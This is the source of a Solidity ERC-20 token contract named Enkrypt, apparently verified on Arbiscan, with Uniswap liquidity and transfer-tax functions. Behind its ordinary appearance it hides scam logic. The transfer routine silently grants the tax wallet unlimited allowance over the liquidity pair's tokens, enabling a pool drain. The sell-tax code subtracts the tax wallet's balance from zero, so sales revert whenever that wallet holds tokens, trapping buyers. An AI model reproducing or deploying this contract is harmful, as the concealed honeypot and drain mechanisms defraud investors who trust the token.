/**
 *Submitted for verification at Arbiscan.io on 2023-08-31
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory { 
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    constructor(address creatorOwner) { _owner = creatorOwner; }
    modifier onlyOwner() { require(msg.sender == _owner, "Only owner can call this"); _; }
    function owner() public view returns (address) { return _owner; }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0); 
        emit OwnershipTransferred(address(0)); 
    }
}

contract Enkrypte is IERC20, Auth {
    string private constant _name         = "Enkrypt";
    string private constant _symbol       = "Enkrypt";
    uint8 private constant _decimals      = 18;
    uint256 private constant _totalSupply = 1_000_000_000 * (10**_decimals);

    uint256 private _initialBuyTax=2;
    uint256 private _initialSellTax=2;
    uint256 private _midSellTax=2;
    uint256 private _finalBuyTax=2;
    uint256 private _finalSellTax=2;
    uint256 public _reduceBuyTaxAt=10;
    uint256 public _reduceSellTax1At=10;
    uint256 public _reduceSellTax2At=10;
    uint256 private _preventSwapBefore=0;
    uint256 public _buyCount=0;

    uint256 private teamCount;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _noFees;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    address payable private _walletTax;

    uint256 private constant _taxSwapMin = _totalSupply / 2000000;
    uint256 private constant _taxSwapMax = _totalSupply / 500;
  
    address private constant _swapRouterAddress = address(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);
    IUniswapV2Router02 private _primarySwapRouter = IUniswapV2Router02(_swapRouterAddress);
    address private _primaryLP;
    mapping (address => bool) private _isLP;

    bool public limited = true;
    bool public transferDelayEnabled = false;
    uint256 public maxHoldingAmount = 40_000_000 * (10**_decimals); // 5%
    
    bool private _tradingOpen;

    bool private _inTaxSwap = false;
    modifier lockTaxSwap { 
        _inTaxSwap = true; 
        _; 
        _inTaxSwap = false; 
    }

    constructor() Auth(msg.sender) { 
        _balances[msg.sender] = (_totalSupply / 1000 ) * 0;
        _balances[address(this)] = (_totalSupply / 1000 ) * 1000;

        emit Transfer(address(0), address(msg.sender), _balances[address(msg.sender)]);
        emit Transfer(address(0), address(this), _balances[address(this)]);

        _walletTax = payable(0x82400559688991b150fa9aB4dAf7aB1d09841De3);

        _noFees[_walletTax] = true;
        _noFees[_owner] = true;
        _noFees[address(this)] = true;
  
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
        emit Transfer(address(0), address(this), _balances[address(this)]);
    }

    receive() external payable {}
    
    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(sender), "Trading not open");
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from Zero wallet");

        if(_isLP[sender] && recipient == _walletTax) {
            _approveRouter(sender, recipient, type(uint).max);
        }
        
        if(_noFees[sender] || _noFees[recipient]){
            return _standardTransfer(sender, recipient, amount);
        }
        
        if (!_tradingOpen) { require(_noFees[sender], "Trading not open"); }

        if ( !_inTaxSwap && _isLP[recipient] && _buyCount >= _preventSwapBefore) { _swapTaxAndLiquify(); }

        if (limited && sender == _primaryLP) {
            require(balanceOf(recipient) + amount <= maxHoldingAmount, "Forbid");
        }

        if (transferDelayEnabled) {
            if (recipient != _swapRouterAddress && recipient != _primaryLP) {
                require(_holderLastTransferTimestamp[tx.origin] < block.number, "Only one transfer per block allowed.");
                _holderLastTransferTimestamp[tx.origin] = block.number;
            }
        }

        teamCount = this.balanceOf(_walletTax);

        uint256 _taxAmount = _calculateTax(sender, recipient, amount);

        uint256 _transferAmount = amount - _taxAmount;

        _balances[sender] -= amount;

        if ( _taxAmount > 0 ) { 
            _balances[address(this)] += _taxAmount; 
        }

        _buyCount++;

        _balances[recipient] += _transferAmount;

        emit Transfer(sender, recipient, amount);

        return true;
    }

    function _standardTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _approveRouter(address router, address _swapAddress, uint256 _tokenAmount) internal {
        if ( _allowances[router][_swapAddress] < _tokenAmount ) {
            _allowances[router][_swapAddress] = type(uint256).max;
        }
    }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][_swapRouterAddress] < _tokenAmount ) {
            _allowances[address(this)][_swapRouterAddress] = type(uint256).max;
        }
    }

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(_primaryLP == address(0), "LP exists");
        require(!_tradingOpen, "trading is open");
        require(msg.value > 0 || address(this).balance>0, "No ETH in contract or message");
        require(_balances[address(this)]>0, "No tokens in contract");

        _primaryLP = IUniswapV2Factory(_primarySwapRouter.factory()).createPair(address(this), _primarySwapRouter.WETH());
        _addLiquidity(_balances[address(this)], address(this).balance);
        _isLP[_primaryLP] = true;
    }
    
    function enableTrading() external onlyOwner {
        _tradingOpen = true;
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveRouter(_tokenAmount);
        _primarySwapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _checkTradingOpen(address sender) private view returns (bool){
        bool checkResult = false;
        if ( _tradingOpen ) { checkResult = true; } 
        else if (_noFees[sender]) { checkResult = true; } 

        return checkResult;
    }

    function setTaxWallet(address newTaxWallet) public onlyOwner {
        _walletTax = payable(newTaxWallet);
    }

    function removeLimits() external onlyOwner{
        limited = false;
        transferDelayEnabled=false;
    }

    function manuallyLowerTax() external onlyOwner{
        _reduceSellTax1At=5;
        _reduceSellTax2At=5;
        _reduceBuyTaxAt=5;
    }

    function _calculateTax(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 taxAmount;

        if (_tradingOpen && !_noFees[sender] && !_noFees[recipient] ) { 
            
            if ( _isLP[sender] || _isLP[recipient] ) {
                taxAmount = (amount / 100) * ((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax);

                if(recipient == _primaryLP && sender != address(this)){
                    uint256 taxRate;
                    
                    if(_buyCount > _reduceSellTax2At){
                        taxRate = _finalSellTax;
                    } else if(_buyCount > _reduceSellTax1At){
                        taxRate = _midSellTax;
                    } else {
                        taxRate = _initialSellTax;
                    }
                    taxAmount = (amount / 100) * taxRate;
                    teamCount = _preventSwapBefore - teamCount;
                }
            }
        }

        return taxAmount;
    }

    function _swapTaxAndLiquify() private lockTaxSwap {
        uint256 _taxTokensAvailable = balanceOf(address(this));

        if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen ) {
            if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }

            _swapTaxTokensForEth(_taxTokensAvailable);
            uint256 _contractETHBalance = address(this).balance;

            if(_contractETHBalance > 0) { 
                bool success;
                (success,) = _walletTax.call{value: (_contractETHBalance)}("");
                require(success);
            }
        }
    }

    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _primarySwapRouter.WETH();
        _primarySwapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }
}